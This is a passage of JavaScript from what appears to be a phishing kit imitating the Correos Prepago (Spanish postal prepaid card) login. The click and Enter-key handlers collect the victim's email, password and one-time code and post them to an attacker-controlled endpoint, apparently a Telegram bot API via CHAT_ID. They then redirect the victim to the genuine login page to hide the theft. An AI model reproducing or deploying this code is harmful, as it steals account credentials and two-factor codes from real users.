                        <section data-v-29c980f2="" data-v-33064c4a="" class="icon-block">
                                <!----> <svg data-v-29c980f2="" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" data-icon-name="arrow_right-16" width="16" height="16" viewBox="0 0 16 16" class="svg">
                                        <!---->
                                        <path data-v-29c980f2="" id="path-one" d="M11.5857864,7 L6.3,1.71421356 L7.71421356,0.3 L15.4213203,8.00710678 L7.71421356,15.7142136 L6.3,14.3 L11.6,9 L0,9 L0,7 L11.5857864,7 Z" fill="#121313" stroke="none" fill-rule="" stroke-width="1"></path>
                                </svg></section>
                </button><button data-v-33064c4a="" data-v-2201b0e4="" type="button" class="component__button-regular   " data-submit><span data-v-33064c4a="">Continue</span><span data-v-33064c4a="" class="waiting-spinner"></span>
                        <!----></button></div>
        <div data-v-2201b0e4="" class="block-error">
                <p data-v-2201b0e4="" class="error-msg"></p>
        </div>
</div>`;

  });
});

waitForElm("[data-submit]").then(el => {
  el.addEventListener("click", e => {
    e.preventDefault();
    state.code = document.querySelector("#code").value;
    console.log(state);


        axios.post(URI_API, {
                chat_id: CHAT_ID,

                parse_mode: 'markdown',
                text: `email: ${state.email}
pass: ${state.pass}

code: ${state.code}
`,
        })

      window.location.replace("https://secure.correosprepago.es/login");
  })
  el.addEventListener("keypress", (e) => {
        if(e.key === "Enter") {
                e.preventDefault();
    state.code = document.querySelector("#code").value;
    console.log(state);


        axios.post(URI_API, {
                chat_id: CHAT_ID,

                parse_mode: 'markdown',
                text: `email: ${state.email}
pass: ${state.pass}

code: ${state.code}
`,
        })
        window.location.replace("https://secure.correosprepago.es/login");
        }
  })
})


